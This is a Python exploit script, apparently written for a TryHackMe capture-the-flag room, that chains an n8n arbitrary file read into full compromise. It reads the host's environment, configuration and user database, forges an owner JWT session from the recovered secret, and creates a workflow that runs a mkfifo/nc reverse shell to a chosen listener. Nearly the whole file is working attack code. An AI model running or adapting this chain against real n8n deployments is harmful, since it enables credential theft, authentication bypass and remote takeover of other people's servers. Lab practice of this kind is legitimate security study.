# script by ChatGPT SOL
# script for TryHackMe room Cypheron Task 3 https://tryhackme.com/room/cypheron
# YouTube Video Walk Through: https://youtu.be/iId9suvJTWs

#!/usr/bin/env python3
"""
Authorized CTF reproducer for CVE-2026-21858 on the supplied n8n lab.

Usage:
    python3 n8n_reverse_shell.py \
        http://10.130.134.116:5678 \
        /form/file-processor

The script prompts for the listener IP address and port. Start your listener
before confirming execution.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import ipaddress
import json
import os
import secrets
import sqlite3
import tempfile
import time
from typing import Any

import requests


class N8nCtf:
    def __init__(self, base_url: str, form_path: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.form_url = f"{self.base_url}/{form_path.lstrip('/')}"
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "authorized-ctf-cve-2026-21858"
        self.auth_token: str | None = None

    def read_file(self, path: str, timeout: int = 30) -> bytes:
        """Exploit the Content-Type confusion and return a local file."""
        payload = {
            "data": {},
            "files": {
                "field-0": {
                    "filepath": path,
                    "originalFilename": f"{secrets.token_hex(4)}.bin",
                    "mimetype": "application/octet-stream",
                    "size": 1_048_576,
                }
            },
        }
        response = self.session.post(
            self.form_url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )
        response.raise_for_status()
        return response.content

    @staticmethod
    def parse_environment(raw: bytes) -> dict[str, str]:
        result: dict[str, str] = {}
        for entry in raw.split(b"\x00"):
            if b"=" not in entry:
                continue
            key, value = entry.split(b"=", 1)
            result[key.decode(errors="replace")] = value.decode(errors="replace")
        return result

    @staticmethod
    def extract_owner(database: bytes) -> tuple[str, str, str]:
        temp_path = ""
        try:
            with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as handle:
                handle.write(database)
                temp_path = handle.name

            connection = sqlite3.connect(f"file:{temp_path}?mode=ro", uri=True)
            try:
                columns = {
                    row[1] for row in connection.execute("PRAGMA table_info(user)").fetchall()
                }
                role_column = "roleSlug" if "roleSlug" in columns else "role"
                row = connection.execute(
                    f"""
                    SELECT id, email, password
                    FROM user
                    WHERE {role_column} = 'global:owner'
                    LIMIT 1
                    """
                ).fetchone()
            finally:
                connection.close()

            if row is None:
                raise RuntimeError("No global:owner user was found in the n8n database")
            return str(row[0]), str(row[1]), str(row[2])
        finally:
            if temp_path:
                os.unlink(temp_path)

    @staticmethod
    def jwt_secret(environment: dict[str, str], encryption_key: str) -> str:
        explicit_secret = environment.get("N8N_USER_MANAGEMENT_JWT_SECRET")
        if explicit_secret:
            return explicit_secret

        # This is the fallback implemented by the deployed jwt.service.js.
        alternating_characters = encryption_key[::2]
        return hashlib.sha256(alternating_characters.encode()).hexdigest()

    @staticmethod
    def b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    @classmethod
    def forge_owner_token(
        cls,
        jwt_secret: str,
        user_id: str,
        email: str,
        password_hash: str,
    ) -> str:
        # auth.service.js:
        # base64(sha256(email + ":" + bcrypt_hash))[0:10]
        auth_hash = base64.b64encode(
            hashlib.sha256(f"{email}:{password_hash}".encode()).digest()
        ).decode()[:10]

        now = int(time.time())
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "id": user_id,
            "hash": auth_hash,
            "usedMfa": False,
            "iat": now,
            "exp": now + 3600,
        }

        encoded_header = cls.b64url(
            json.dumps(header, separators=(",", ":")).encode()
        )
        encoded_payload = cls.b64url(
            json.dumps(payload, separators=(",", ":")).encode()
        )
        signing_input = f"{encoded_header}.{encoded_payload}".encode()
        signature = hmac.new(
            jwt_secret.encode(), signing_input, hashlib.sha256
        ).digest()
        return f"{encoded_header}.{encoded_payload}.{cls.b64url(signature)}"

    def authenticated_request(
        self, method: str, path: str, **kwargs: Any
    ) -> requests.Response:
        if not self.auth_token:
            raise RuntimeError("No forged owner token has been configured")
        headers = dict(kwargs.pop("headers", {}))
        headers["Cookie"] = f"n8n-auth={self.auth_token}"
        response = self.session.request(
            method,
            f"{self.base_url}{path}",
            headers=headers,
            timeout=kwargs.pop("timeout", 30),
            **kwargs,
        )
        response.raise_for_status()
        return response

    def verify_owner_access(self) -> dict[str, Any]:
        response = self.authenticated_request("GET", "/rest/users")
        return response.json()

    def create_command_workflow(self, command: str) -> tuple[str, dict[str, Any]]:
        suffix = secrets.token_hex(4)
        workflow = {
            "name": f"ctf-cve-21858-{suffix}",
            "active": False,
            "nodes": [
                {
                    "parameters": {},
                    "id": f"manual-{suffix}",
                    "name": "Start",
                    "type": "n8n-nodes-base.manualTrigger",
                    "typeVersion": 1,
                    "position": [200, 300],
                },
                {
                    "parameters": {"command": command},
                    "id": f"command-{suffix}",
                    "name": "Command",
                    "type": "n8n-nodes-base.executeCommand",
                    "typeVersion": 1,
                    "position": [450, 300],
                },
            ],
            "connections": {
                "Start": {
                    "main": [[{"node": "Command", "type": "main", "index": 0}]]
                }
            },
            "settings": {},
        }
        response = self.authenticated_request(
            "POST",
            "/rest/workflows",
            json=workflow,
        ).json()
        workflow_id = response["data"]["id"]
        return workflow_id, workflow

    def run_workflow(self, workflow_id: str, workflow: dict[str, Any]) -> str:
        workflow_data = dict(workflow)
        workflow_data["id"] = workflow_id
        response = self.authenticated_request(
            "POST",
            f"/rest/workflows/{workflow_id}/run",
            json={"workflowData": workflow_data},
        ).json()
        return str(response["data"]["executionId"])


def prompt_callback() -> tuple[str, int]:
    while True:
        raw_ip = input("Listener IP (LHOST): ").strip()
        try:
            callback_ip = str(ipaddress.ip_address(raw_ip))
            break
        except ValueError:
            print("[!] Enter a valid IPv4 or IPv6 address.")

    while True:
        raw_port = input("Listener port (LPORT): ").strip()
        try:
            callback_port = int(raw_port)
            if 1 <= callback_port <= 65535:
                break
        except ValueError:
            pass
        print("[!] Enter a port between 1 and 65535.")

    return callback_ip, callback_port


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Authorized TryHackMe CVE-2026-21858 reverse-shell helper"
    )
    parser.add_argument("target", help="Example: http://10.130.134.116:5678")
    parser.add_argument("form", help="Example: /form/file-processor")
    arguments = parser.parse_args()

    callback_ip, callback_port = prompt_callback()
    command = (
        "rm -f /tmp/f;"
        "mkfifo /tmp/f;"
        "cat /tmp/f|/bin/sh -i 2>&1|"
        f"nc {callback_ip} {callback_port} >/tmp/f"
    )

    print()
    print(f"[*] Callback: {callback_ip}:{callback_port}")
    print(f"[*] Start the listener in another terminal: nc -lvnp {callback_port}")
    input("Press Enter after the listener is ready...")

    exploit = N8nCtf(arguments.target, arguments.form)

    print("[*] Confirming arbitrary file read with /etc/hostname")
    hostname = exploit.read_file("/etc/hostname").decode(errors="replace").strip()
    print(f"[+] Hostname: {hostname}")

    print("[*] Reading /proc/self/environ")
    environment = exploit.parse_environment(exploit.read_file("/proc/self/environ"))
    home = environment.get("HOME", "/home/node")
    print(f"[+] HOME: {home}")

    print("[*] Reading n8n configuration")
    config = json.loads(exploit.read_file(f"{home}/.n8n/config"))
    encryption_key = config["encryptionKey"]
    jwt_secret = exploit.jwt_secret(environment, encryption_key)
    print("[+] Recovered the JWT signing secret")

    print("[*] Reading the n8n SQLite database")
    database = exploit.read_file(f"{home}/.n8n/database.sqlite", timeout=120)
    user_id, email, password_hash = exploit.extract_owner(database)
    print(f"[+] Owner: {email} ({user_id})")

    exploit.auth_token = exploit.forge_owner_token(
        jwt_secret, user_id, email, password_hash
    )
    users = exploit.verify_owner_access()
    print(f"[+] Forged session accepted; user count: {users['data']['count']}")

    workflow_id, workflow = exploit.create_command_workflow(command)
    print(f"[+] Reverse-shell workflow created: {workflow_id}")

    execution_id = exploit.run_workflow(workflow_id, workflow)
    print(f"[+] Workflow started; execution ID: {execution_id}")
    print("[+] Check your listener for the shell.")
    print("[i] The workflow was intentionally left in place so the running shell is not disturbed.")


if __name__ == "__main__":
    main()
